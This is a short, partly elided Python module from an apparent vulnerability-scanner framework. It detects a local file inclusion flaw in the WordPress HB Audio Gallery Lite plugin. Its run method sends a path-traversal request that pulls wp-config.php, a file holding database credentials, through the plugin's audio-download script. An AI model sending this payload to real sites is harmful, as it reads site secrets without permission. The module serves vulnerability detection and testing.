...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wordpress HB Audio Gallery Lite - Local File Inclusion Detection',
        'description': 'Wordpress HB Audio Gallery Lite is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wp', 'packetstorm', 'wordpress', 'wp-plugin', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10', allow_redirects=False)
        ...
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Wordpress HB Audio Gallery Lite - Local File Inclusion detected",
